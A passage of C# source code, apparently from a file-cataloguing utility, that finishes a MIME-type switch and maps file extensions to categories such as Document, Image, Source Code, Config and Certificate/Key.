            ".pem" or ".key"   => "application/x-pem-file",
            _        => "application/octet-stream"
        };

        private static string GetCategory(string ext) => ext.ToLowerInvariant() switch
        {
            ".doc" or ".docx" or ".odt" or ".rtf" or ".txt" or ".one" => "Document",
            ".xls" or ".xlsx" or ".ods" or ".csv"                      => "Spreadsheet",
            ".ppt" or ".pptx" or ".odp"                                => "Presentation",
            ".pdf"                                                      => "PDF",
            ".jpg" or ".jpeg" or ".png" or ".gif" or ".bmp"
                or ".tiff" or ".heic" or ".raw"                        => "Image",
            ".zip" or ".rar" or ".7z" or ".tar" or ".gz"              => "Archive",
            ".html" or ".htm" or ".xml" or ".json"
                or ".yaml" or ".yml"                                   => "Web/Data",
            ".epub" or ".mobi"                                         => "Ebook",
            ".msg" or ".eml" or ".ics" or ".vcf"                      => "Email/Contact",
            ".py" or ".js" or ".ts" or ".cs" or ".java" or ".cpp"
                or ".h" or ".rb" or ".php" or ".sh" or ".bat"
                or ".ps1"                                              => "Source Code",
            ".env" or ".cfg" or ".ini" or ".conf"                     => "Config",
            ".sql" or ".db" or ".sqlite" or ".accdb" or ".mdb"        => "Database",
            ".key" or ".pem" or ".pfx" or ".p12" or ".cer"           => "Certificate/Key",
        };
    }
}
